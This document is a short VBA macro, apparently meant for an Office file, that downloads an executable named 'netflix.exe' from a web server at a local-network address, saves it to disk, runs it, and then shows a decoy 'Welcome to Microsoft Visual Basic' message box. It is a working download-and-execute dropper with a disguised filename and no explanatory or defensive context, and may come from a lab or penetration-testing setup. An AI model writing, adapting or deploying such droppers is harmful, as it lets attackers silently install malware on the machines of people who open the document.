Sub hellaatr()



Const ADTYPEBINARY = 1

Const ADSAVECREATEOVERWRITE = 2



Dim filename

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")

Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")

xHttp.Open "GET", "http://192.168.1.4:8000/netflix.exe", False

xHttp.Send


filename = "C:\Temp\" & DateDiff("s", #1/1/1970#, Now())
With bStrm

    .Type = 1 '//binary

    .Open

    .write xHttp.responseBody

    .savetofile "netflix.exe", 2 '//overwrite

End With



Shell ("netflix.exe")



MsgBox ("Welcome to Microsoft Visual Basic")


End Sub








